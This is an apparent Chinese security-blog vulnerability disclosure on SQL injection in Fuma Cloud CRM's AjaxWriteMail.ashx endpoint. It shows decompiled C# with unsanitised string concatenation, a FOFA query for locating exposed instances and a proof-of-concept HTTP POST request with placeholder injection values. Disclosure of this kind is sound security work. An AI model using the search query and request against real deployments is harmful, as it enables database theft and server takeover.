---
title: "孚盟云CRM AjaxWriteMail.ashx 多处SQL注入漏洞"
source: https://mrxn.net/jswz/fumacrm-AjaxWriteMail-SQLi.html
asset_dir: assets/孚盟云crm-ajaxwritemail.ashx-多处sql注入漏洞
---

# 孚盟云CRM AjaxWriteMail.ashx 多处SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/10/13 11:25
- 681浏览
- [0评论](#comment)
- 23分钟阅读

深入探索

软件即服务

客户关系管理

app

---

# 漏洞简介

上海孚盟[软件](#)有限公司是一家专业的外贸SaaS服务和行业解决方案提供商。其旗下产品孚盟云AjaxWriteMail.ashx接口存在[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞，未经身份验证的远程攻击者除了可以利用 SQL注入漏洞获取数据库中的信息(例如，管理员后台密码、站点的用户个人信息)之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。

客户关系管理

# 影响版本

# fofa语法

> app="孚盟软件-孚盟云"

# 漏洞分析

直接看 `AjaxWriteMail.ashx` 对应的dll文件 `FumaCRM_BS.NewWeb.dll` 里有关 **AjaxWriteMail** 方法的实现如下

```
public void ProcessRequest(HttpContext context)
{
  try
  {
    if (UserCookie.GetCookieValue("empId") == null)
      return;
    string str1 = FumaCRM_BS.Utility.Encrypt.Encrypt.DesDecrypt(UserCookie.GetCookieValue("empId"));
    string str2 = context.Request["method"].ToString();
    string empty1 = string.Empty;
    string empty2 = string.Empty;
    StringBuilder builder = new StringBuilder();
    Hashtable hashtable = new Hashtable();
    string s = str2;
    // ISSUE: reference to a compiler-generated method
    switch (\u003CPrivateImplementationDetails\u003E.ComputeStringHash(s))
    {
      case 484109797:
        if (!string.op_Equality(s, "updateLastedContactTable"))
          break;
        string str3 = context.Request["mails"] == null ? "" : context.Request["mails"].ToString();
        if (string.IsNullOrEmpty(str3))
          break;
        string str4 = str3;
        char[] chArray = new char[1]{ ';' };
        foreach (string mail in str4.Split(chArray))
          this.updateLastedContactTable(mail, str1);
        break;
```

深入探索

SQL注入检测工具

服务器安全服务

Docker加速服务

当**method=updateLastedContactTable**时，进入`updateLastedContactTable`方法

```
private void updateLastedContactTable(string mail, string empId)
{
  string empty1 = string.Empty;
  bool flag = false;
  string sql1;
  if (mail.IndexOf('@') > -1)
    sql1 = $"select 1 from tmLastedContact where ContactMailAddress = '{mail}' and OwnerID='{empId}'";
  else
    sql1 = $"select 1 from tmLastedContact where ContactEmpId = '{mail}' and OwnerID='{empId}'";
  DataTable dataTable1 = this._createPageManager.SearchSql(sql1, "");
```

**empId**和参数**mails**按照分号分割后被直接拼接进SQL语句中执行，期间无过滤或校验，从而造成[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞。empId参数是被直接拼接金SQL语句，也是注入点。

SQL注入防护

`getContactList`、`saveCategory`、`GetCustInfo`、`excetSpLastTrackInfo`、`SendMail_send`和`SendMail`方法也存在同样的拼接导致的SQL注入漏洞。

[![孚盟云CRM AjaxWriteMail.ashx 多处SQL注入漏洞](images/img-001-086a15f09aa2.webp)](https://image.mrxn.net/be6ec48245114db884e57ea48ed2bb1f.webp)

[![孚盟云CRM AjaxWriteMail.ashx 多处SQL注入漏洞](images/img-002-e8777d02004f.webp)](https://image.mrxn.net/069519473aef4c1eb34da1365888f546.webp)

[![孚盟云CRM AjaxWriteMail.ashx 多处SQL注入漏洞](images/img-003-0f7582f28d68.webp)](https://image.mrxn.net/42b31689f6a14d97aeb6143973035e53.webp)

[![孚盟云CRM AjaxWriteMail.ashx 多处SQL注入漏洞](images/img-004-87c0176dca95.webp)](https://image.mrxn.net/dc377d5fd5f543d89d8dcb4935fe3d7c.webp)

[![孚盟云CRM AjaxWriteMail.ashx 多处SQL注入漏洞](images/img-005-071659e8ed63.webp)](https://image.mrxn.net/dfb788da32164d21b865fd9610a26b31.webp)

[![孚盟云CRM AjaxWriteMail.ashx 多处SQL注入漏洞](images/img-006-d00975e6daf1.webp)](https://image.mrxn.net/146b60234d0645e58e95b249faffc2dc.webp)

# 漏洞复现

```
POST /m/Dingding/Ajax/AjaxWriteMail.ashx HTTP/1.1
Host: fumacrm.mrxn.net
Cookie: UserCookie={"empId":"SQLI_POC","corpId": "1"}
Content-Type: application/x-www-form-urlencoded

method=updateLastedContactTable&mails=SQLI_POC
```

[![孚盟云CRM AjaxWriteMail.ashx 多处SQL注入漏洞](images/img-007-5ad642572d45.webp)](https://image.mrxn.net/6d10941c329d4655b1bac6a6fe08f72b.webp)

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#asp.net](https://mrxn.net/tag/asp.net)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
